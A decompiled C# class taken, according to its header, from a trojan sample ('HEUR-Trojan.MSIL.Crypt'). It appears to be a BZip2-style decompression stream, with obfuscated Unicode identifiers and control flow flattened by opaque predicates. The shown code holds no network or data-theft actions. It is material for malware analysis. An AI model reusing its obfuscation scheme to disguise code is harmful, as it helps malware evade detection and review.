// Decompiled with JetBrains decompiler
// Type: @ծ
// Assembly: uLqhNaw2rJQahaaHEibmS0F8CAhQ12f0pD0UHJWVCL, Version=9.1.2.0, Culture=neutral, PublicKeyToken=null
// MVID: D212B58E-19EB-4690-837D-62FC76EFC9D2
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Crypt.gen-c92d5d3e7959656b93039f2d0479f1cd50ca98907ea5aa0a925724b1dca475a3.exe

using System;
using System.IO;
using System.Runtime.CompilerServices;

internal sealed class \u0040ծ : Stream
{
  private bool \u0040ӓ;
  private bool \u0040Ӕ;
  private long \u0040ӕ;
  internal int \u0040Ӗ;
  internal int \u0040ӗ;
  internal int \u0040Ә;
  internal bool \u0040ә;
  internal int \u0040Ӛ;
  internal int \u0040ӛ;
  internal readonly object \u0040Ӝ;
  internal int \u0040ӝ;
  internal object \u0040Ӟ;
  internal int \u0040ӟ;
  internal \u0040ծ.\u0040ӓ \u0040Ӡ;
  internal uint \u0040ӡ;
  internal uint \u0040Ӣ;
  internal uint \u0040ӣ;
  internal uint \u0040Ӥ;
  internal int \u0040ӥ;
  internal int \u0040Ӧ;
  internal int \u0040ӧ;
  internal int \u0040Ө;
  internal int \u0040ө;
  internal int \u0040Ӫ;
  internal int \u0040ӫ;
  internal int \u0040Ӭ;
  internal char \u0040ӭ;
  internal object \u0040Ӯ;

  [MethodImpl(MethodImplOptions.NoInlining)]
  public \u0040ծ(Stream _param1, bool _param2)
  {
    \u0040ծ.\u0040ӳ();
    int num;
    if (\u0040ծ.\u0040Ӳ())
    {
      if (!\u0040ծ.\u0040ӳ())
      {
        num = 6;
        goto label_3;
      }
    }
    else
      goto label_10;
label_2:
    \u0040ծ.\u0040ӱ((object) this);
    goto label_11;
label_3:
    while (true)
    {
      switch (num)
      {
        case 0:
        case 6:
          \u0040ծ.\u0040Ӱ();
          goto case 1;
        case 1:
        case 8:
          this.\u0040Ӝ = (object) new \u0040Պ(true);
          if (true)
          {
            num = 2;
            continue;
          }
          goto case 2;
        case 2:
          this.\u0040ӟ = -1;
          num = 3;
          continue;
        case 3:
          this.\u0040Ӡ = (\u0040ծ.\u0040ӓ) 1;
          num = 5;
          continue;
        case 4:
          goto label_11;
        case 5:
          goto label_2;
        case 7:
          this.\u0040Ӕ = _param2;
          num = 9;
          continue;
        case 9:
          this.\u0040ӯ();
          num = 10;
          continue;
        case 10:
          goto label_9;
        default:
          if (true)
          {
            num = 4;
            continue;
          }
          goto case 9;
      }
    }
label_9:
    return;
label_10:
    num = 8;
    if (true)
      goto label_3;
label_11:
    this.\u0040Ӟ = (object) _param1;
    num = 7;
    goto label_3;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  int Stream.Rm7(byte[] _param1, int _param2, int _param3)
  {
    int num1 = 0;
label_12:
    int num2;
    int num3;
    while (true)
    {
      switch (num1)
      {
        case 0:
          if (_param2 >= 0)
          {
            if (_param3 < 0)
            {
              if (!\u0040ծ.\u0040ӳ())
              {
                num1 = 10;
                continue;
              }
              goto case 7;
            }
            else if (_param2 + _param3 > _param1.Length)
            {
              if (!\u0040ծ.\u0040ӳ())
              {
                num1 = 8;
                continue;
              }
              goto case 5;
            }
            else if (this.\u0040Ӟ != null)
            {
              num3 = _param2 + _param3;
              goto case 5;
            }
            else
              goto label_10;
          }
          else
          {
            if (!\u0040ծ.\u0040ӳ())
            {
              num1 = 3;
              continue;
            }
            if (true)
            {
              num1 = 9;
              continue;
            }
            goto label_24;
          }
        case 1:
        case 3:
          goto label_1;
        case 2:
        case 6:
          goto label_17;
        case 4:
        case 9:
          goto label_10;
        case 5:
          num2 = _param2;
          num1 = 2;
          continue;
        case 7:
          int num4;
          if ((num4 = \u0040ծ.\u0040ӷ((object) this)) < 0)
          {
            int num5 = 11;
            num1 = \u0040ծ.\u0040ӳ() ? num5 : num5;
            continue;
          }
          _param1[num2++] = (byte) num4;
          num1 = 6;
          continue;
        case 8:
          goto label_21;
        case 10:
          goto label_6;
        case 11:
          goto label_24;
        default:
          if (\u0040ծ.\u0040Ӳ())
          {
            num1 = 5;
            continue;
          }
          goto case 0;
      }
    }
label_1:
    throw new IndexOutOfRangeException((string) \u0040ծ.\u0040ӵ(\u0040ծ.\u0040Ӵ(600546), (object) _param2));
label_6:
    throw new IndexOutOfRangeException((string) \u0040ծ.\u0040ӵ(\u0040ծ.\u0040Ӵ(600598), (object) _param3));
label_10:
    throw new IOException((string) \u0040ծ.\u0040Ӵ(600722));
label_17:
    while (num2 < num3)
    {
      if (true)
      {
        num1 = 7;
        goto label_12;
      }
    }
    goto label_24;
label_21:
    throw new IndexOutOfRangeException((string) \u0040ծ.\u0040Ӷ(\u0040ծ.\u0040Ӵ(600648), (object) _param2, (object) _param3, (object) _param1.Length));
label_24:
    return num2 - _param2;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  int Stream.N83()
  {
    int num;
    if (!\u0040ծ.\u0040ӳ())
      num = 1;
    else
      goto label_19;
label_11:
    int ӟ;
    \u0040ծ.\u0040ӓ ӡ;
    while (true)
    {
      switch (num)
      {
        case 0:
        case 1:
label_5:
          ӟ = this.\u0040ӟ;
          num = 7;
          continue;
        case 2:
        case 4:
        case 8:
        case 10:
          goto label_21;
        case 3:
        case 6:
          switch (ӡ)
          {
            case (\u0040ծ.\u0040ӓ) 0:
              goto label_7;
            case (\u0040ծ.\u0040ӓ) 1:
              goto label_8;
            case (\u0040ծ.\u0040ӓ) 2:
              goto label_9;
            case (\u0040ծ.\u0040ӓ) 3:
              goto label_10;
            case (\u0040ծ.\u0040ӓ) 4:
              \u0040ԝ.\u0040ӗ(this);
              if (!\u0040ծ.\u0040ӳ())
              {
                num = 4;
                continue;
              }
              goto label_5;
            case (\u0040ծ.\u0040ӓ) 5:
              goto label_16;
            case (\u0040ծ.\u0040ӓ) 6:
              \u0040ԝ.\u0040ێ(this);
              if (true)
              {
                num = 2;
                continue;
              }
              goto label_18;
            case (\u0040ծ.\u0040ӓ) 7:
              \u0040ԝ.\u0040֮(this);
              num = 10;
              continue;
            default:
              num = 5;
              continue;
          }
        case 5:
          goto label_20;
        case 7:
          ++this.\u0040ӕ;
          num = 9;
          continue;
        case 9:
label_18:
          ӡ = this.\u0040Ӡ;
          goto case 3;
        default:
          num = 8;
          continue;
      }
    }
label_7:
    return -1;
label_8:
    throw new IOException((string) \u0040ծ.\u0040Ӵ(600770));
label_9:
    throw new IOException((string) \u0040ծ.\u0040Ӵ(600770));
label_10:
    \u0040ԝ.\u0040ܷ(this);
    goto label_21;
label_16:
    throw new IOException((string) \u0040ծ.\u0040Ӵ(600770));
label_20:
    throw new IOException((string) \u0040ծ.\u0040Ӵ(600770));
label_19:
    num = 6;
    if (\u0040ծ.\u0040Ӳ())
      goto label_11;
label_21:
    return ӟ;
  }

  [SpecialName]
  [MethodImpl(MethodImplOptions.NoInlining)]
  bool Stream.\u003956()
  {
    if (this.\u0040ӓ)
      throw new ObjectDisposedException((string) \u0040ծ.\u0040Ӵ(600792));
    return \u0040ծ.\u0040Ӹ(this.\u0040Ӟ);
  }

  [SpecialName]
  [MethodImpl(MethodImplOptions.NoInlining)]
  bool Stream.kf8() => false;

  [SpecialName]
  [MethodImpl(MethodImplOptions.NoInlining)]
  bool Stream.J94()
  {
    if (this.\u0040ӓ)
      throw new ObjectDisposedException((string) \u0040ծ.\u0040Ӵ(600792));
    return \u0040ծ.\u0040ӹ(this.\u0040Ӟ);
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  void Stream.J75()
  {
    if (this.\u0040ӓ)
      throw new ObjectDisposedException((string) \u0040ծ.\u0040Ӵ(600792));
    \u0040ծ.\u0040Ӻ(this.\u0040Ӟ);
  }

  [SpecialName]
  [MethodImpl(MethodImplOptions.NoInlining)]
  long Stream.\u003188() => throw new NotImplementedException();

  [SpecialName]
  [MethodImpl(MethodImplOptions.NoInlining)]
  long Stream.\u00374P() => this.\u0040ӕ;

  [SpecialName]
  [MethodImpl(MethodImplOptions.NoInlining)]
  void Stream.\u0037M3(long _param1) => throw new NotImplementedException();

  [MethodImpl(MethodImplOptions.NoInlining)]
  long Stream.\u0033EP(long _param1, SeekOrigin _param2) => throw new NotImplementedException();

  [MethodImpl(MethodImplOptions.NoInlining)]
  void Stream.\u0033IF(long _param1) => throw new NotImplementedException();

  [MethodImpl(MethodImplOptions.NoInlining)]
  void Stream.\u0039Nt(byte[] _param1, int _param2, int _param3) => throw new NotImplementedException();

  [MethodImpl(MethodImplOptions.NoInlining)]
  void Stream.osw(bool _param1)
  {
    try
    {
      if (this.\u0040ӓ)
        return;
      \u0040ծ.\u0040ӳ();
      int num = !\u0040ծ.\u0040Ӳ() ? 4 : 2;
      while (true)
      {
        switch (num)
        {
          case 0:
          case 2:
            if (!_param1)
              goto label_8;
            else
              goto case 1;
          case 1:
          case 4:
            if (this.\u0040Ӟ == null)
              goto label_8;
            else
              goto case 3;
          case 3:
            \u0040ծ.\u0040ӻ(this.\u0040Ӟ);
            num = 5;
            continue;
          case 5:
            goto label_8;
          default:
            num = 3;
            continue;
        }
      }
label_8:
      this.\u0040ӓ = true;
    }
    finally
    {
      \u0040ծ.\u0040Ӽ((object) this, _param1);
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  private void \u0040ӯ()
  {
    int num1 = 2;
    int num2;
    while (true)
    {
      switch (num1)
      {
        case 0:
          \u0040ԝ.\u0040ٮ(this, 'h', 2);
          num1 = 8;
          continue;
        case 1:
          \u0040ԝ.\u0040ھ(this);
          num1 = 13;
          continue;
        case 2:
          if (this.\u0040Ӟ != null)
          {
            if (\u0040ծ.\u0040Ӹ(this.\u0040Ӟ))
            {
              \u0040ԝ.\u0040ٮ(this, 'B', 0);
              if (true)
              {
                num1 = 4;
                continue;
              }
              goto case 0;
            }
            else
            {
              num1 = 7;
              continue;
            }
          }
          else
          {
            if (\u0040ծ.\u0040Ӳ())
            {
              num1 = 5;
              continue;
            }
            goto case 1;
          }
        case 3:
          goto label_8;
        case 4:
          \u0040ԝ.\u0040ٮ(this, 'Z', 1);
          num1 = 0;
          continue;
        case 5:
          goto label_11;
        case 6:
        case 11:
          if (num2 >= 49)
          {
            num1 = 12;
            continue;
          }
          goto label_8;
        case 7:
          goto label_1;
        case 8:
          num2 = \u0040ծ.\u0040ӷ(this.\u0040Ӟ);
          break;
        case 9:
        case 10:
          \u0040ԝ.\u0040ۙ(this);
          num1 = 1;
          continue;
        case 12:
          if (num2 <= 57)
          {
            this.\u0040Ә = num2 - 48;
            goto case 9;
          }
          else
          {
            if (true)
            {
              num1 = 3;
              continue;
            }
            goto case 2;
          }
        case 13:
          goto label_10;
      }
      num1 = !\u0040ծ.\u0040Ӳ() ? 10 : 11;
    }
label_1:
    throw new IOException((string) \u0040ծ.\u0040Ӵ(600852));
label_10:
    return;
label_8:
    throw new IOException((string) \u0040ծ.\u0040ӽ(\u0040ծ.\u0040Ӵ(600902), (object) ((char) num2).ToString()));
label_11:
    throw new IOException((string) \u0040ծ.\u0040Ӵ(600818));
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  void Stream.Q6R()
  {
    \u0040ծ.\u0040ӳ();
    int num;
    if (\u0040ծ.\u0040Ӳ())
    {
      if (\u0040ծ.\u0040Ӳ())
      {
        num = 2;
        goto label_6;
      }
    }
    else
      goto label_3;
label_2:
    Stream ӟ = (Stream) this.\u0040Ӟ;
    goto label_4;
label_3:
    num = 3;
    goto label_6;
label_4:
    if (ӟ == null)
      return;
    goto label_8;
label_6:
    while (true)
    {
      switch (num)
      {
        case 0:
        case 2:
          goto label_2;
        case 1:
        case 3:
          goto label_4;
        case 4:
          goto label_8;
        default:
          num = 4;
          continue;
      }
    }
label_8:
    try
    {
      if (this.\u0040Ӕ)
        return;
      \u0040ծ.\u0040ӻ((object) ӟ);
    }
    finally
    {
      this.\u0040Ӯ = (object) null;
      this.\u0040Ӟ = (object) null;
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040Ӱ() => \u0040ո.\u0040Ӕ();

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040ӱ(object _param0) => ((Stream) _param0).\u002Ector();

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static bool \u0040Ӳ() => true;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static bool \u0040ӳ() => false;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040Ӵ(int _param0) => (object) \u0040շ.\u0040ӻ(_param0);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040ӵ(object _param0, object _param1) => (object) string.Format((string) _param0, _param1);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040Ӷ(object _param0, object _param1, object _param2, object _param3) => (object) string.Format((string) _param0, _param1, _param2, _param3);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static int \u0040ӷ(object _param0) => ((Stream) _param0).ReadByte();

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static bool \u0040Ӹ(object _param0) => ((Stream) _param0).CanRead;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static bool \u0040ӹ(object _param0) => ((Stream) _param0).CanWrite;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040Ӻ(object _param0) => ((Stream) _param0).Flush();

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040ӻ(object _param0) => ((Stream) _param0).Close();

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040Ӽ(object _param0, bool _param1) => __nonvirtual (((Stream) _param0).Dispose(_param1));

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040ӽ(object _param0, object _param1) => (object) ((string) _param0 + (string) _param1);

  internal enum \u0040ӓ
  {
  }

  internal sealed class \u0040Ӕ
  {
    public readonly object \u0040ӓ;
    public readonly object \u0040Ӕ;
    public readonly object \u0040ӕ;
    public readonly object \u0040Ӗ;
    public readonly object \u0040ӗ;
    public readonly object \u0040Ә;
    public readonly object \u0040ә;
    public readonly object \u0040Ӛ;
    public readonly object \u0040ӛ;
    public readonly object \u0040Ӝ;
    public readonly object \u0040ӝ;
    public readonly object \u0040Ӟ;
    public readonly object \u0040ӟ;
    public object \u0040Ӡ;
    public object \u0040ӡ;

    [MethodImpl(MethodImplOptions.NoInlining)]
    public \u0040Ӕ(int _param1)
    {
      int num = 4;
      while (true)
      {
        switch (num)
        {
          case 0:
            this.\u0040ӟ = (object) new byte[\u0040կ.\u0040Ӛ];
            if (true)
            {
              num = 12;
              continue;
            }
            goto case 9;
          case 1:
            this.\u0040ӕ = (object) new byte[\u0040կ.\u0040ӝ];
            if (!\u0040ծ.\u0040Ӕ.\u0040ӥ())
            {
              num = 13;
              continue;
            }
            goto case 5;
          case 2:
          case 11:
            this.\u0040Ӝ = (object) new int[257];
            if (true)
            {
              num = 14;
              continue;
            }
            goto case 16;
          case 3:
            this.\u0040Ӟ = (object) \u0040կ.\u0040Ӡ<char>(\u0040կ.\u0040Ӛ, \u0040կ.\u0040Ӗ);
            num = 0;
            continue;
          case 4:
            \u0040ծ.\u0040Ӕ.\u0040Ӣ();
            num = 7;
            continue;
          case 5:
          case 15:
            \u0040ծ.\u0040Ӕ.\u0040ӣ((object) this);
            if (true)
            {
              num = 10;
              continue;
            }
            goto case 10;
          case 6:
            this.\u0040ә = (object) \u0040կ.\u0040Ӡ<int>(\u0040կ.\u0040Ӛ, \u0040կ.\u0040Ӗ);
            goto case 16;
          case 7:
            this.\u0040ӓ = (object) new bool[256];
            if (\u0040ծ.\u0040Ӕ.\u0040Ӥ())
            {
              num = 9;
              continue;
            }
            goto case 3;
          case 8:
            this.\u0040ӛ = (object) new int[\u0040կ.\u0040Ӛ];
            goto case 2;
          case 9:
            this.\u0040Ӕ = (object) new byte[256];
            num = 1;
            continue;
          case 10:
            this.\u0040ӗ = (object) new int[256];
            num = 17;
            continue;
          case 12:
            this.\u0040ӡ = (object) new byte[_param1 * \u0040կ.\u0040ӓ];
            num = 18;
            continue;
          case 13:
            this.\u0040Ӗ = (object) new byte[\u0040կ.\u0040ӝ];
            \u0040ծ.\u0040Ӕ.\u0040ӥ();
            num = !\u0040ծ.\u0040Ӕ.\u0040Ӥ() ? 2 : 15;
            continue;
          case 14:
            this.\u0040ӝ = (object) new byte[256];
            if (true)
            {
              num = 3;
              continue;
            }
            goto label_20;
          case 16:
            this.\u0040Ӛ = (object) \u0040կ.\u0040Ӡ<int>(\u0040կ.\u0040Ӛ, \u0040կ.\u0040Ӗ);
            num = 8;
            continue;
          case 17:
            this.\u0040Ә = (object) \u0040կ.\u0040Ӡ<int>(\u0040կ.\u0040Ӛ, \u0040կ.\u0040Ӗ);
            if (true)
            {
              num = 6;
              continue;
            }
            goto case 12;
          case 18:
            goto label_18;
          default:
            num = 16;
            continue;
        }
      }
label_18:
      return;
label_20:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void \u0040Ӣ() => \u0040ո.\u0040Ӕ();

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void \u0040ӣ(object _param0) => _param0.\u002Ector();

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static bool \u0040Ӥ() => true;

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static bool \u0040ӥ() => false;
  }
}
